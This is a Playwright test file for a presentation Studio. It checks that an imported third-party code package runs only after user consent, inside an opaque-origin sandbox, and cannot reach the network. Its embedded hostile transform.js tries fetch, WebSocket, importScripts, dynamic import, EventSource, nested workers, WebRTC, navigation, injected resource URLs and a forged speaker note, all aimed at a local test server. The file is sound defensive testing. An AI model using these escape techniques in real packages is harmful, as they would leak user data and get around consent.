import dgram from 'node:dgram';
import http from 'node:http';
import JSZip from 'jszip';
import { expect, gotoStudio, livePreview, setEditorContent, test } from './studio-fixture';

// ── A code package runs in the Studio only after consent, and reaches nothing (contract note §9) ──
//
// A third-party code package (a component whose `transform.js` someone else wrote) is imported
// through the REAL Library, used by a deck, and approved from the notice above the preview. It is
// hostile: at load and on every slide its code tries fetch, a WebSocket, `importScripts`, a dynamic
// `import()`, an EventSource, a nested worker, WebRTC to a UDP port, and a navigation, and the
// section it returns names a local server seven ways and forges a speaker note. A REAL loopback
// HTTP + WebSocket server and a UDP socket count what reaches them (HARD RULE #23: a network log,
// not a claim about a string). The CONTROLS show the log can see: the same Studio page reaches the
// HTTP server (an authored image, after "Load them") and the UDP socket (WebRTC from the page).
//
//   1. UNAPPROVED — the slide shows the engine's own content and a note; the notice offers the
//      code; the log is empty.
//   2. APPROVED — the package draws; the log is still empty; the preview holds no reference to the
//      server, no forged note, and the package ran in a sandboxed frame with an opaque origin.
//   3. CONTROLS — the page itself reaches both listeners.

test.describe.configure({ timeout: 300_000 });

const tallyCode = (origin: string, udp: number) => `
try { fetch("${origin}/load-fetch").catch(function(){}); } catch (e) {}
try { importScripts("${origin}/load-import"); } catch (e) {}
function tally(slide, kit) {
  try { fetch("${origin}/fetch").catch(function(){}); } catch (e) {}
  try { new WebSocket("${origin.replace('http', 'ws')}/websocket"); } catch (e) {}
  try { import("${origin}/dynimport").catch(function(){}); } catch (e) {}
  try { new EventSource("${origin}/eventsource"); } catch (e) {}
  try { new Worker(URL.createObjectURL(new Blob(["fetch('${origin}/nested').catch(function(){})"]))); } catch (e) {}
  try { var pc = new (self.RTCPeerConnection || self.webkitRTCPeerConnection)({ iceServers: [{ urls: "stun:127.0.0.1:${udp}" }] }); pc.createDataChannel("x"); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }); } catch (e) {}
  try { self.location.href = "${origin}/navigate"; } catch (e) {}
  var n = Number((/<li>(\\d+)<\\/li>/.exec(slide.html) || [])[1] || 0);
  var marks = "";
  for (var i = 0; i < n; i++) marks += '<span class="tally-mark">' + (i + 1) + "</span>";
  var hostile = '<img src="${origin}/img" alt=""><img srcset="${origin}/srcset 1x" alt=""><video poster="${origin}/poster"></video>' +
    '<svg width="4" height="4"><image href="${origin}/svgimage" width="4" height="4"></image></svg>' +
    '<span style="background-image:url(${origin}/cssurl)">x</span><a href="${origin}/link">link</a>' +
    '<aside class="lattice-notes" hidden data-slide="1">FORGED-NOTE</aside>';
  return "\\n" + slide.html.replace(/<ul>[\\s\\S]*?<\\/ul>/, '<div class="tally-marks" data-count="' + n + '">' + marks + "</div>" + hostile) + "\\n";
}
export { tally as default };
`;

async function tallyZip(code: string): Promise<Buffer> {
	const zip = new JSZip();
	zip.file('tally/tally.manifest.json', JSON.stringify({ name: 'tally', type: 'component', format: 1 }));
	zip.file('tally/tally.styles.css', 'section.tally .tally-marks { display: flex; gap: 0.5em; color: var(--accent); }\n');
	zip.file('tally/tally.gallery.md', '<!-- _class: tally -->\n\n## Tally\n\n- 3\n');
	zip.file('tally/tally.transform.js', code);
	return zip.generateAsync({ type: 'nodebuffer' });
}

async function openLibrary(page: Parameters<typeof gotoStudio>[0]) {
	const docked = page.getByRole('button', { name: 'Open Library' });
	await ((await docked.count()) ? docked : page.getByRole('button', { name: 'Library', exact: true })).click();
}

// All three engines: a blob Worker inside an opaque-origin sandboxed frame is exactly the kind of
// thing engines disagree on. `@gecko` runs on the desktop (Chromium) project and the gecko one; the
// `@webkit-tablet` twin runs on WebKit (the desktop project skips a title naming @webkit).
for (const tag of [' @gecko', ' @webkit-tablet']) {
test(`a code package runs in the Studio only after consent, sandboxed, and reaches nothing${tag}`, async ({ page, browserName }) => {
		const hits: string[] = [];
		const server = http.createServer((req, res) => {
			hits.push(req.url || '');
			res.writeHead(200, { 'Content-Type': 'image/png', 'Access-Control-Allow-Origin': '*' });
			res.end();
		});
		server.on('upgrade', (req, sock) => {
			hits.push(req.url || '');
			sock.destroy();
		});
		await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()));
		const origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
		const udpHits: string[] = [];
		const udp = dgram.createSocket('udp4');
		udp.on('message', () => udpHits.push('udp'));
		await new Promise<void>((r) => udp.bind(0, '127.0.0.1', () => r()));
		const udpPort = udp.address().port;
		const settle = () => page.waitForTimeout(2500);

		try {
			await gotoStudio(page);
			await openLibrary(page);
			await page.locator('input[type="file"][accept=".zip"]').setInputFiles({ name: 'tally.zip', mimeType: 'application/zip', buffer: await tallyZip(tallyCode(origin, udpPort)) });
			await expect(page.locator('[data-sonner-toast]').first()).toContainText('1 component(s)');
			await page.keyboard.press('Escape');

			const deck = '<!-- _class: tally -->\n\n## Three wins\n\n- 3\n\n<!-- the author note -->\n';
			await setEditorContent(page, deck);
			const preview = livePreview(page);
			const notice = page.locator('[data-slot="code-packages"]');

			// 1. UNAPPROVED.
			await expect(notice).toHaveAttribute('data-state', 'unapproved', { timeout: 30_000 });
			await expect(notice).toContainText('This deck uses code from the component “tally”, which has not run.');
			await notice.getByRole('button', { name: 'What it is' }).click();
			await expect(page.locator('[data-slot="code-packages-detail"]')).toContainText(/tally\.transform\.js, [\d,]+ bytes, sha256 [0-9a-f]{64}/);
			await expect(preview.locator('[data-package-error="tally"]')).toContainText('its code has not been approved in this browser');
			await expect(preview.locator('.tally-marks')).toHaveCount(0);
			await expect(page.locator('iframe[data-lattice-code-sandbox]')).toHaveCount(0);
			await settle();
			expect(hits, `the unapproved package reached the server: ${hits.join(', ')}`).toEqual([]);
			expect(udpHits).toEqual([]);

			// 2. APPROVED. Each render opens the package's frame and closes it when it ends, so the frame
			// is watched as it appears rather than looked for afterwards.
			await page.evaluate(() => {
				const w = window as unknown as { __sandboxes: string[] };
				w.__sandboxes = [];
				new MutationObserver((records) => {
					for (const r of records) for (const n of r.addedNodes) if (n instanceof HTMLIFrameElement && n.hasAttribute('data-lattice-code-sandbox')) w.__sandboxes.push(String(n.getAttribute('sandbox')));
				}).observe(document.body, { childList: true, subtree: true });
			});
			await notice.getByRole('button', { name: 'Run the code of tally' }).click();
			await expect(preview.locator('.tally-marks[data-count="3"] .tally-mark')).toHaveCount(3, { timeout: 30_000 });
			await expect(notice).toHaveCount(0);
			const sandboxes = await page.evaluate(() => (window as unknown as { __sandboxes: string[] }).__sandboxes);
			expect(sandboxes.length, 'the package ran in a sandbox frame').toBeGreaterThan(0);
			expect(new Set(sandboxes)).toEqual(new Set(['allow-scripts']));
			// Closed once its render ended: no frame outlives the render that needed it.
			await expect(page.locator('iframe[data-lattice-code-sandbox]')).toHaveCount(0);
			await settle();
			expect(hits, `the approved package reached the server: ${hits.join(', ')}`).toEqual([]);
			expect(udpHits, 'the approved package reached the UDP socket (WebRTC)').toEqual([]);
			const shown = await preview.locator('section').first().evaluate((s) => s.outerHTML);
			expect(shown).not.toContain(origin.replace('http://', ''));
			expect(shown).not.toMatch(/class="lattice-notes"[^>]*>[^<]*FORGED-NOTE/);
			expect(shown).toMatch(/<img alt="">/);
			const evidence = process.env.LATTICE_EVIDENCE_DIR;
			if (evidence) await preview.locator('section').first().screenshot({ path: `${evidence}/code-package-approved.png` });

			// 3. CONTROLS: the same page reaches both listeners, so the empty logs above are refusals.
			// Firefox's CI build gathers no loopback candidates for the page's own WebRTC, even with
			// `media.peerconnection.ice.loopback` (two nightly runs), so on Gecko this control cannot
			// see and is skipped, and the UDP zero there rests on the worker having no WebRTC at all.
			if (browserName === 'firefox') {
				test.info().annotations.push({ type: 'unverified', description: 'Gecko: no working UDP control; the UDP zero is not proven here' });
			} else {
				await page.evaluate(
					async ({ udpPort }) => {
						const pc = new RTCPeerConnection({ iceServers: [{ urls: `stun:127.0.0.1:${udpPort}` }] });
						pc.createDataChannel('x');
						await pc.setLocalDescription(await pc.createOffer());
					},
					{ udpPort },
				);
				await expect.poll(() => udpHits.length, { timeout: 15_000 }).toBeGreaterThan(0);
			}
			await setEditorContent(page, `<!-- _class: tally -->\n\n## Three wins\n\n- 3\n\n![control](${origin}/control.png)\n`);
			const web = page.locator('[data-slot="web-images"]');
			await expect(web).toHaveAttribute('data-state', 'blocked', { timeout: 30_000 });
			await web.getByRole('button', { name: /^Load \d+ images? from/ }).click();
			await expect.poll(() => hits.filter((h) => h === '/control.png').length, { timeout: 30_000 }).toBeGreaterThan(0);
			expect(hits.filter((h) => h !== '/control.png'), 'only the control reached the server').toEqual([]);
		} finally {
			// `close()` waits for every open connection, and the browser can still hold one to this
			// server (an image it loaded): the nightly's first desktop run spent 290 s here after every
			// step had passed, then timed out. End them first.
			server.closeAllConnections();
			await new Promise((r) => server.close(() => r(null)));
			udp.close();
		}
	});
}
